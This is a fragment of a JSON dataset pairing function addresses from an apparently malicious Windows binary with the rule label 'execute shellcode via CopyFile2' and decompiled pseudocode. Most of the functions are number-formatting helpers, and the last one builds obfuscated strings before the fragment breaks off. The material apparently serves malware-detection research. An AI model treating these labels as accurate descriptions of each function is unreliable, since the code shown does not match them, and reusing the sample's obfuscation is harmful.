        "decompiled_code": "\nvoid __cdecl fcn.00404e8f(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    iVar2 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar2 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00403acb();\n    iVar1 = iVar2 + iVar1 * 2 + -2;\n    *(in_ECX + 0x34) = iVar1;\n    iVar2 = iVar1;\n    while ((0 < *(in_ECX + 0x28) || (iVar4 != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        iVar4 = fcn.00401820(iVar4, arg_10h, 0, iVar4 >> 0x20);\n        uVar3 = extraout_ECX + 0x30U & 0xffff;\n        if (0x39 < uVar3) {\n            uVar3 = (arg_14h ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(in_ECX + 0x34) = uVar3;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        iVar2 = *(in_ECX + 0x34);\n    }\n    *(in_ECX + 0x38) = iVar1 - iVar2 >> 1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 2;\n    return;\n}\n",
        "token_count": 455
    },
    "00404fe3": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404fe3(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    char extraout_CL;\n    char cVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    iVar3 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar3 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00405911();\n    iVar3 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x34) = iVar3;\n    iVar1 = iVar3;\n    while ((0 < *(in_ECX + 0x28) || (iVar4 != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        iVar4 = fcn.00401820(iVar4, arg_10h, 0, iVar4 >> 0x20);\n        cVar2 = extraout_CL + '0';\n        if ('9' < cVar2) {\n            cVar2 = cVar2 + (arg_14h ^ 1) * ' ' + '\\a';\n        }\n        **(in_ECX + 0x34) = cVar2;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        iVar1 = *(in_ECX + 0x34);\n    }\n    *(in_ECX + 0x38) = iVar3 - iVar1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    return;\n}\n",
        "token_count": 433
    },
    "0040508d": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040508d(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    iVar2 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar2 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00403acb();\n    iVar1 = iVar2 + iVar1 * 2 + -2;\n    *(in_ECX + 0x34) = iVar1;\n    iVar2 = iVar1;\n    while ((0 < *(in_ECX + 0x28) || (arg_8h != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        uVar3 = arg_8h % arg_ch + 0x30 & 0xffff;\n        if (0x39 < uVar3) {\n            uVar3 = (arg_10h ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(in_ECX + 0x34) = uVar3;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        iVar2 = *(in_ECX + 0x34);\n        arg_8h = arg_8h / arg_ch;\n    }\n    *(in_ECX + 0x38) = iVar1 - iVar2 >> 1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 2;\n    return;\n}\n",
        "token_count": 396
    },
    "00405222": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405222(uint *param_1)\n\n{\n    char cVar1;\n    uint arg_10h;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t arg_14h;\n    uint arg_18h;\n    uint *var_4h;\n    \n    var_4h = param_1;\n    cVar1 = fcn.00404737(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = param_1 + 0x10;\n        }\n        cVar1 = fcn.004052e5(puVar3);\n        if (cVar1 == '\\0') {\n            return 0;\n        }\n        cVar1 = fcn.00406528();\n        if (cVar1 == '\\0') {\n            return 1;\n        }\n        param_1[0xe] = 1;\n    }\n    else {\n        var_4h = var_4h & 0xffff0000;\n        cVar1 = fcn.00402031(&var_4h);\n        if (cVar1 == '\\0') {\n            return 0;\n        }\n        cVar1 = fcn.00406528();\n        if (cVar1 == '\\0') {\n            return 1;\n        }\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = param_1 + 0x10;\n        }\n        arg_18h = param_1[2];\n        arg_14h = var_4h;\n        arg_10h = fcn.00405911();\n        iVar2 = fcn.00401f32(param_1 + 0xe, puVar3, arg_10h, arg_14h, arg_18h);\n        if (iVar2 != 0) {\n            *(param_1 + 0xc) = 1;\n        }\n    }\n    puVar3 = param_1 + 0x10;\n    if (param_1[0x111] != NULL) {\n        puVar3 = param_1[0x111];\n    }\n    param_1[0xd] = puVar3;\n    return 1;\n}\n",
        "token_count": 546
    },
    "00405597": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405597(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    char cVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar3 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00405911();\n    iVar3 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x34) = iVar3;\n    iVar1 = iVar3;\n    while ((0 < *(in_ECX + 0x28) || (arg_8h != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        cVar2 = arg_8h % arg_ch + '0';\n        if ('9' < cVar2) {\n            cVar2 = cVar2 + (arg_10h ^ 1) * ' ' + '\\a';\n        }\n        **(in_ECX + 0x34) = cVar2;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        iVar1 = *(in_ECX + 0x34);\n        arg_8h = arg_8h / arg_ch;\n    }\n    *(in_ECX + 0x38) = iVar3 - iVar1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    return;\n}\n",
        "token_count": 379
    },
    "00405a06": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405a06(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    char cVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar3 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00405911();\n    iVar3 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x34) = iVar3;\n    iVar1 = iVar3;\n    while ((0 < *(in_ECX + 0x28) || (arg_8h != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        cVar2 = arg_8h % arg_ch + '0';\n        if ('9' < cVar2) {\n            cVar2 = cVar2 + (arg_10h ^ 1) * ' ' + '\\a';\n        }\n        **(in_ECX + 0x34) = cVar2;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        iVar1 = *(in_ECX + 0x34);\n        arg_8h = arg_8h / arg_ch;\n    }\n    *(in_ECX + 0x38) = iVar3 - iVar1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    return;\n}\n",
        "token_count": 380
    },
    "00405e02": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405e02(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    char cVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar3 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00405911();\n    iVar3 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x34) = iVar3;\n    iVar1 = iVar3;\n    while ((0 < *(in_ECX + 0x28) || (arg_8h != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        cVar2 = arg_8h % arg_ch + '0';\n        if ('9' < cVar2) {\n            cVar2 = cVar2 + (arg_10h ^ 1) * ' ' + '\\a';\n        }\n        **(in_ECX + 0x34) = cVar2;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        iVar1 = *(in_ECX + 0x34);\n        arg_8h = arg_8h / arg_ch;\n    }\n    *(in_ECX + 0x38) = iVar3 - iVar1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    return;\n}\n",
        "token_count": 380
    },
    "00406113": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406113(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    iVar2 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar2 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00403acb();\n    iVar1 = iVar2 + iVar1 * 2 + -2;\n    *(in_ECX + 0x34) = iVar1;\n    iVar2 = iVar1;\n    while ((0 < *(in_ECX + 0x28) || (iVar4 != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        iVar4 = fcn.00401820(iVar4, arg_10h, 0, iVar4 >> 0x20);\n        uVar3 = extraout_ECX + 0x30U & 0xffff;\n        if (0x39 < uVar3) {\n            uVar3 = (arg_14h ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(in_ECX + 0x34) = uVar3;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        iVar2 = *(in_ECX + 0x34);\n    }\n    *(in_ECX + 0x38) = iVar1 - iVar2 >> 1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 2;\n    return;\n}\n",
        "token_count": 453
    },
    "004064bf": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004064bf(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    iVar2 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar2 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00403acb();\n    iVar1 = iVar2 + iVar1 * 2 + -2;\n    *(in_ECX + 0x34) = iVar1;\n    iVar2 = iVar1;\n    while ((0 < *(in_ECX + 0x28) || (arg_8h != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        uVar3 = arg_8h % arg_ch + 0x30 & 0xffff;\n        if (0x39 < uVar3) {\n            uVar3 = (arg_10h ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(in_ECX + 0x34) = uVar3;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        iVar2 = *(in_ECX + 0x34);\n        arg_8h = arg_8h / arg_ch;\n    }\n    *(in_ECX + 0x38) = iVar1 - iVar2 >> 1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 2;\n    return;\n}\n",
        "token_count": 395
    },
    "00406505": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00406505(uint *param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *var_4h;\n    \n    param_1[5] = param_1[5] + 4;\n    puVar4 = param_1 + 0x10;\n    *(param_1 + 0xf) = 1;\n    var_4h._0_2_ = *(param_1[5] + -4);\n    var_4h = param_1;\n    cVar1 = fcn.00401889(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        var_4h._0_2_ = var_4h & 0xff;\n        var_4h = var_4h & 0xffff0000 | var_4h;\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        iVar2 = fcn.0040105f(puVar3, &var_4h, *(*param_1[2] + 4), param_1[2]);\n        if (iVar2 < 0) {\n            *(param_1 + 0xc) = 1;\n        }\n    }\n    else {\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        *puVar3 = var_4h;\n    }\n    puVar3 = param_1[0x111];\n    if (puVar3 != NULL) {\n        puVar4 = puVar3;\n    }\n    param_1[0xd] = puVar4;\n    param_1[0xe] = 1;\n    return CONCAT31(puVar3 >> 8, 1);\n}\n",
        "token_count": 469
    },
    "00406645": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406645(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    iVar2 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar2 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00403acb();\n    iVar1 = iVar2 + iVar1 * 2 + -2;\n    *(in_ECX + 0x34) = iVar1;\n    iVar2 = iVar1;\n    while ((0 < *(in_ECX + 0x28) || (iVar4 != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        iVar4 = fcn.00401820(iVar4, arg_10h, 0, iVar4 >> 0x20);\n        uVar3 = extraout_ECX + 0x30U & 0xffff;\n        if (0x39 < uVar3) {\n            uVar3 = (arg_14h ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(in_ECX + 0x34) = uVar3;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        iVar2 = *(in_ECX + 0x34);\n    }\n    *(in_ECX + 0x38) = iVar1 - iVar2 >> 1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 2;\n    return;\n}\n",
        "token_count": 453
    },
    "00406726": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406726(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    char cVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar3 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00405911();\n    iVar3 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x34) = iVar3;\n    iVar1 = iVar3;\n    while ((0 < *(in_ECX + 0x28) || (arg_8h != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        cVar2 = arg_8h % arg_ch + '0';\n        if ('9' < cVar2) {\n            cVar2 = cVar2 + (arg_10h ^ 1) * ' ' + '\\a';\n        }\n        **(in_ECX + 0x34) = cVar2;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        iVar1 = *(in_ECX + 0x34);\n        arg_8h = arg_8h / arg_ch;\n    }\n    *(in_ECX + 0x38) = iVar3 - iVar1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    return;\n}\n",
        "token_count": 379
    },
    "0040687f": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040687f(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    iVar2 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar2 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00403acb();\n    iVar1 = iVar2 + iVar1 * 2 + -2;\n    *(in_ECX + 0x34) = iVar1;\n    iVar2 = iVar1;\n    while ((0 < *(in_ECX + 0x28) || (iVar4 != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        iVar4 = fcn.00401820(iVar4, arg_10h, 0, iVar4 >> 0x20);\n        uVar3 = extraout_ECX + 0x30U & 0xffff;\n        if (0x39 < uVar3) {\n            uVar3 = (arg_14h ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(in_ECX + 0x34) = uVar3;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        iVar2 = *(in_ECX + 0x34);\n    }\n    *(in_ECX + 0x38) = iVar1 - iVar2 >> 1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 2;\n    return;\n}\n",
        "token_count": 454
    },
    "004068e8": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004068e8(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    iVar2 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar2 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00403acb();\n    iVar1 = iVar2 + iVar1 * 2 + -2;\n    *(in_ECX + 0x34) = iVar1;\n    iVar2 = iVar1;\n    while ((0 < *(in_ECX + 0x28) || (iVar4 != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        iVar4 = fcn.00401820(iVar4, arg_10h, 0, iVar4 >> 0x20);\n        uVar3 = extraout_ECX + 0x30U & 0xffff;\n        if (0x39 < uVar3) {\n            uVar3 = (arg_14h ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(in_ECX + 0x34) = uVar3;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        iVar2 = *(in_ECX + 0x34);\n    }\n    *(in_ECX + 0x38) = iVar1 - iVar2 >> 1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 2;\n    return;\n}\n",
        "token_count": 454
    },
    "004135b0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nint32_t __fastcall fcn.004135b0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uchar *puVar11;\n    uchar *puVar12;\n    int32_t *in_FS_OFFSET;\n    int32_t aiStack312 [30];\n    uint uStack192;\n    uint uStack180;\n    int32_t in_stack_ffffff58;\n    uint32_t uStack148;\n    uint32_t uStack144;\n    uint uStack128;\n    uint32_t uStack124;\n    uint32_t uStack120;\n    uint uStack104;\n    uint32_t uStack100;\n    uint32_t uStack96;\n    uint uStack80;\n    uint32_t uStack76;\n    int32_t iStack72;\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t *piStack60;\n    uchar *puStack56;\n    int32_t *piStack52;\n    int32_t *piStack48;\n    uchar *puStack44;\n    int32_t *piStack40;\n    uchar uStack36;\n    uchar *puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = &stack0xffffff58;\n    uStack24 = 0x414a80;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iStack68 = param_1 + 4;\n    *(param_1 + 4) = 0;\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 0x18) = 0xf;\n    *(param_1 + 4) = 0;\n    iStack64 = param_1 + 0x34;\n    *(param_1 + 0x34) = 0;\n    *(param_1 + 0x44) = 0;\n    *(param_1 + 0x48) = 0xf;\n    *(param_1 + 0x34) = 0;\n    uStack20 = 8;\n    iStack72 = param_1;\n    uVar5 = fcn.004024b9(0x20, in_stack_ffffff58);\n    uStack180 = 0x41363a;\n    fcn.00401a32(uVar5);\n    puStack44 = &stack0xffffff58;\n    piStack40 = &stack0xfffffec8;\n    puStack56 = &stack0xffffff40;\n    uStack192 = 0;\n    fcn.00402f72(0x3f, uStack36, \"gmhhvrgzsspdonwngtkswpmtickrliykwsxuyzenmapufkzqjuxxjdfhakgdbjy\");\n    piVar3 = piStack40;\n    piStack52 = piStack40 + 0x18;\n    piStack40[0x18] = 0;\n    piVar3[0x1c] = 0;\n    piVar3[0x1d] = 0xf;\n    *(piVar3 + 0x18) = 0;\n    uStack20 = 0xc;\n    fcn.00402f72(0x60, uStack36, \n                 \"jmvarmjqwoytlpnyhnjyxfwjrjeyoekxvlkehhevagmuxbgrwjbxfrtlovpgevxlseujfrxojhachmaijpkekknnxsffcapa\");\n    piVar3 = piStack40;\n    piStack48 = piStack40 + 0xf;\n    piStack40[0xf] = 0;\n    piVar3[0x13] = 0;\n    piVar3[0x14] = 0xf;\n    *(piVar3 + 0xf) = 0;\n    uStack20 = 0xd;\n    fcn.00402f72(0x3e, uStack36, \"mhhlpporopboaduogjgidcweosdwmdhiemqobwxcozwcjlogfsbhjviztfrava\");\n    piVar3 = piStack40;\n    piStack60 = piStack40 + 9;\n    piStack40[9] = 0;\n    piVar3[0xd] = 0;\n    piVar3[0xe] = 0xf;\n    *(piVar3 + 9) = 0;\n    uStack20 = 0xe;\n    fcn.00402f72(0x59, uStack36, \n                 \"xmaxhgvtrkxhjhwdtzalxmdynzkcyokuysilrivrnhzpgvtljqhihqzbybyognijtfqsrciwyzihodneihdvpoocu\");\n    piVar3 = piStack40;\n    piStack40[3] = 0;\n    piVar3[7] = 0;\n    piVar3[8] = 0xf;\n    *(piVar3 + 3) = 0;\n    uStack20 = 0xf;\n    fcn.00402f72(0x38, uStack36, \"dkfhuhajhxfmbokrqseodvxqxzzmultlhlfphgotudfnjrkhtntmtglk\");\n    piVar3 = piStack40;\n    *piStack40 = &stack0xffffff58;\n    piVar3[2] = 0x40b53200;\n    piVar3[1] = 0;\n    piVar3[0x16] = 0x40be3800;\n    piVar3[0x15] = 0;\n    piVar3[0x17] = 0x66e;\n    uStack20 = 8;\n    fcn.00402955();\n    puVar2 = puStack44;\n    if (0xf < uStack148) {\n        uVar6 = uStack148 + 1;\n        iVar8 = in_stack_ffffff58;\n        if (uVar6 < 0x1000) {\ncode_r0x0041381a:\n            *(puStack44 + -4) = uVar6;\n            *(puVar2 + -8) = iVar8;\n            *(puVar2 + -0xc) = 0x413821;\n            uStack148 = fcn.00401a32(*(puVar2 + -8));\n            goto code_r0x00413824;\n        }\n        iVar8 = *(in_stack_ffffff58 + -4);\n        if ((in_stack_ffffff58 + -4) - iVar8 < 0x20) {\n            uVar6 = uStack148 + 0x24;\n            goto code_r0x0041381a;\n        }\n        uStack20 = 0;\n        *(puStack44 + -4) = 0x413fca;\n        fcn.004047f5();\n        puVar12 = puVar2;\ncode_r0x00413fca:\n        uStack20 = 1;\n        *(puVar12 + -4) = 0x413fd6;\n        fcn.004047f5();\ncode_r0x00413fd6:\n        uStack20 = 2;\n        *(puVar12 + -4) = 0x413fe2;\n        fcn.004047f5();\ncode_r0x00413fe2:\n        uStack20 = 3;\n        *(puVar12 + -4) = 0x413fee;\n        fcn.004047f5();\ncode_r0x00413fee:\n        uStack20 = 4;\n        *(puVar12 + -4) = 0x413ffa;\n        fcn.004047f5();\ncode_r0x00413ffa:\n        uStack20 = 5;\n        *(puVar12 + -4) = 0x414006;\n        fcn.004047f5();\ncode_r0x00414006:\n        uStack20 = 6;\n        *(puVar12 + -4) = 0x414012;\n        fcn.004047f5();\ncode_r0x00414012:\n        uStack20 = 7;\n        *(puVar12 + -4) = 0x41401e;\n        fcn.004047f5();\n        *(puVar12 + -4) = &stack0xfffffffc;\n        *(puVar12 + -0x98) = 0x41402f;\n        fcn.004052d1();\n        *(puVar12 + -0x98) = &stack0x00000008;\n        *(puVar12 + -300) = 0x41403f;\n        fcn.004052d1();\n        *(puVar12 + -300) = &stack0x00000014;\n        *(puVar12 + -0x1c0) = 0x41404f;\n        fcn.004052d1();\n        *(puVar12 + -0x1c0) = &stack0x00000020;\n        *(puVar12 + -0x254) = 0x41405f;\n        fcn.004052d1();\n        *(puVar12 + -0x254) = &stack0x0000002c;\n        *(puVar12 + -0x2e8) = 0x41406f;\n        fcn.004052d1();\n        *(puVar12 + -0x2e8) = &stack0x00000038;\n        *(puVar12 + -0x37c) = 0x41407f;\n        fcn.004052d1();\n        *(puVar12 + -0x37c) = &stack0x00000044;\n        *(puVar12 + -0x410) = 0x41408f;\n        fcn.004052d1();\n        *(puVar12 + -0x410) = &stack0x00000050;\n        *(puVar12 + -0x4a4) = 0x41409f;\n        fcn.004052d1();\n        *(puVar12 + -0x4a4) = &stack0x0000005c;\n        *(puVar12 + -0x538) = 0x4140b2;\n        iVar8 = fcn.00403a76();\n        return iVar8;\n    }\ncode_r0x00413824:\n    puStack44 = puVar2;\n    *(puVar2 + -4) = uStack148;\n    piStack40 = puVar2 + -0x4c;\n    *(puVar2 + -0x34) = 0;\n    *(puVar2 + -0x24) = 0;\n    *(puVar2 + -0x20) = 0xf;\n    puVar2[-0x34] = 0;\n    puVar2[-0x54] = uStack36;\n    *(puVar2 + -0x50) = \"ggktxaiuwtotrecmdueayeuwrqzjufswcibma\";\n    *(puVar2 + -0x58) = 0x25;\n    *(puVar2 + -0x5c) = 0x413885;\n    fcn.00402f72();\n    piVar3 = piStack40;\n    *piStack40 = 0;\n    piVar3[1] = 0x1355;\n    iVar1 = *0x4ea40c;\n    iVar9 = *0x4ea408;\n    iVar8 = *0x4ea404;\n    piVar3[2] = *0x4ea400;\n    piVar3[3] = iVar8;\n    piVar3[4] = iVar9;\n    piVar3[5] = iVar1;\n    piVar3[0xc] = 0x9aa;\n    piVar3[0xd] = 0x2e6;\n    *(piVar3 + 0xe) = 0;\n    iVar1 = *0x4ea42c;\n    iVar9 = *0x4ea428;\n    iVar8 = *0x4ea424;\n    piVar3[0xf] = *0x4ea420;\n    piVar3[0x10] = iVar8;\n    piVar3[0x11] = iVar9;\n    piVar3[0x12] = iVar1;\n    uVar6 = piVar3[0xb];\n    if (0xf < uVar6) {\n        iVar8 = piVar3[6];\n        uVar7 = uVar6 + 1;\n        iVar9 = iVar8;\n        if (0xfff < uVar7) {\n            iVar9 = *(iVar8 + -4);\n            puVar12 = puVar2 + -0x58;\n            if (0x1f < (iVar8 + -4) - iVar9) goto code_r0x00413fca;\n            uVar7 = uVar6 + 0x24;\n        }\n        *(puVar2 + -0x5c) = uVar7;\n        *(puVar2 + -0x60) = iVar9;\n        *(puVar2 + -100) = 0x4138ef;\n        uVar6 = fcn.00401a32(*(puVar2 + -0x60));\n    }\n    puVar2 = puStack44;\n    *(puStack44 + -4) = uVar6;\n    piStack40 = puVar2 + -0x3c;\n    *(puVar2 + -0x24) = 0;\n    *(puVar2 + -0x14) = 0;\n    *(puVar2 + -0x10) = 0xf;\n    puVar2[-0x24] = 0;\n    puVar2[-0x44] = uStack36;\n    *(puVar2 + -0x40) = 